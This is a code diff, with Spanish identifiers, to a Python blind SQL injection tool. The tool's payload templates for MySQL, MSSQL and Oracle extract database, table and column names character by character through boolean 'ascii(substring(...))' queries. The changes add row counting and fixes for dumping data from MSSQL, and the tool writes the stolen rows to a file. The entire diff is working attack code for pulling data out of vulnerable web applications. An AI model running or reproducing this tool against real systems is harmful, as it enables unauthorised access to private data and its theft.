@@ -58,8 +58,8 @@ class Injection:
 		'bases':["lol" , "'" , "AND ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM master..sysdatabases offset) x WHERE x.RowNo = " , "))" , "-- -+"],
 		'current':["' and   ascii(substring(database(),1,1))" , "'" , "and   ascii(substring((SELECT DB_NAME())," , "))" , "-- -+"],
 		'tablas':["'" , " and   ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM "  ,  "..sysobjects offset WHERE xtype = 'U') x WHERE x.RowNo = "  ,"))" , "-- -+"],
-		'columnas':["'" , " and   ascii(substring((SELECT COLUMN_NAME FROM (SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME ASC) AS RowNo,COLUMN_NAME FROM  "  ,  ".INFORMATION_SCHEMA.columns offset) x WHERE x.RowNo = "  ,"))" , "-- -+"],
-		'datos':["'" , " and   ascii(substring((SELECT " , " # FROM (SELECT ROW_NUMBER() OVER (ORDER BY # ASC) AS RowNo,# FROM "  ,  " offset) x WHERE x.RowNo = "  ,"))" , "-- -+",")"]
+		'columnas':["'" , " and   ascii(substring((SELECT COLUMN_NAME FROM (SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME ASC) AS RowNo,COLUMN_NAME FROM  "  ,  ") x WHERE x.RowNo = "  ,"))" , "-- -+"],
+		'datos':["'" , " and   ascii(substring((SELECT CAST((SELECT " , " # FROM (SELECT ROW_NUMBER() OVER (ORDER BY $ ASC) AS RowNo,# FROM "  ,  " offset) x WHERE x.RowNo = "  ,"))" , "-- -+",") AS varchar))"]
 	}
 	catalogoOracle={
 		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
@@ -121,10 +121,11 @@ class Injection:
 		elif tipo == "tablas":
 			coord = "," + str(fila)+",1"
 			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
+			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
 		elif tipo == "columnas":
 			coord = "," + str(fila)+",1"
 			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
-			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
+			print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
 		elif tipo == "datos":
 			coord = "," + str(fila)+",1"
 			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][3]+str(columna)+manejador[tipo][6]+coord+manejador[tipo][4]
@@ -132,6 +133,9 @@ class Injection:
 
 		#print "Coordenada: "+coord
 		#print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"
+		# consulta = requests.get(url=direccion+"=NULL-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+		# if consulta.text == ok:
+		# 	return ""
 		consulta = requests.get(url=direccion+"="+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 		if consulta.text == ok:
 			return caracter
@@ -304,7 +308,7 @@ class Injection:
 
 		for where in bases.keys():
 			tablaCol=['']
-			if where != "information_schema" and where != "mysql" and where != "performance_schema" and where != "msdb" and where != "master":
+			if where != "information_schema" and where != "mysql" and where != "performance_schema" and where != "msdb" and where != "master"  and where != '':
 				for table in bases[where]:
 		#			columnas = 0
 		#			consulta3 = requests.get(url=self.server+"' and substring((select count(*) from information_schema.columns where table_name ='"+table+"' and table_schema = '"+where+"'),1,1)=0 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
@@ -315,6 +319,8 @@ class Injection:
 					bandera = 0
 					indiceY	= 1
 					indiceX = 0
+					columna1 = ""
+					banderaCol = 0
 					if tipo == "mssql":
 						indiceX = 1
 					columna = ""	
@@ -323,7 +329,7 @@ class Injection:
 					elif tipo == "pgsql":
 						condicion = table+"'"
 					elif tipo == "mssql":
-						condicion = where
+						condicion = where+".INFORMATION_SCHEMA.COLUMNS  offset WHERE TABLE_NAME=N'"+table+"'"
 						#print "lol de control 2 "+table+" - "+where
 					#print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
 					while char == "No encontrado" and bandera != 1:
@@ -338,9 +344,12 @@ class Injection:
 								columna += char
 								indiceY = indiceY +1
 						tablaCol.append(columna)
+						if banderaCol == 0:
+							columna1 = columna
+							banderaCol = 1
 						if where != '' and table != '' and columna != '':
 
-							print "Base: "+where+" Tabla:"+table+" columnas: "+columna
+							print "\n\nBase: "+where+" Tabla:"+table+" columnas: "+columna
 							f.write("Base: "+where+" Tabla:"+table+" columnas: "+columna+"\n");
 							char2 = "No encontrado"
 							bandera2 = 0
@@ -348,29 +357,59 @@ class Injection:
 							indiceX2 = 0
 							if tipo == "mssql":
 								indiceX2 = 1
-							while char2 == "No encontrado" and bandera2 != 1:
+							limite = 0
+							count = requests.get(url=obj.server+"' and 1=2-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+							pagCont = requests.get(url=obj.server+"' and 1=1-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+							
+							#print count.text
+							#print pagCont.text
+							if tipo == "mysql":
+								while count.text != pagCont.text:
+									count = requests.get(url=obj.server+"' and (select count(*) from "+where+"."+table+")="+str(limite)+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+									#print obj.server+"' and (select count(*) from "+where+"."+table+")="+str(limite)+"-- -+"
+									limite = limite +1
+
+							elif tipo == "pgsql":
+								while count.text != pagCont.text:
+									count = requests.get(url=obj.server+"' and (select count(*) from "+table+")="+str(limite)+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+									limite = limite +1
+							elif tipo == "mssql":
+								while count.text != pagCont.text:
+									count = requests.get(url=obj.server+"' and (select count(*) from "+where+".."+table+")="+str(limite)+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+									limite = limite +1
+
+							limite2 = 0
+							while limite2 != limite-1:
+								#print "\nLimite:"+str(limite)+"    Limite2 :"+str(limite2)
 								char2 = ""
 								dato = ""
 								#print "lol"
+								
+								
+
 								while char2 != "No encontrado":
 									if tipo == "mysql":
 										condicion2 = columna + " from " + where + "." + table + " "
 									elif tipo == "pgsql":
 										condicion2 = columna + " from " + table + " "
 									elif tipo == "mssql":
-										condicion2 = manejador["datos"][2].replace("#",columna)+where+".."+table
+										condicion2 = manejador["datos"][2].replace("#",columna).replace("$",columna1)+where+".."+table
 									char2 =obj.busqueda(obj,manejador,"datos",ok,126,32,indiceY2,indiceX2,condicion2)
 									#print "Caracter: "+char2
 									if char2 != "No encontrado":
 										dato += char2
 										indiceY2 = indiceY2 +1
+										#print "Char2: "+char2+" columna: "+columna+" Base: "+where
+
 								#bases[where].append(tabla)
+								#print "==============================\nChar2: "+char2+" columna: "+columna+" Base: "+where+" Dato: "+dato+"=========================\n"								
 								f.write(dato+"\n")
 								#print "TABLA: "+tabla
 								dato = ""
 								indiceX2 = indiceX2 + 1
 								bandera2 = indiceY2
 								indiceY2 = 1
+								limite2 = limite2 +1
 
 
 
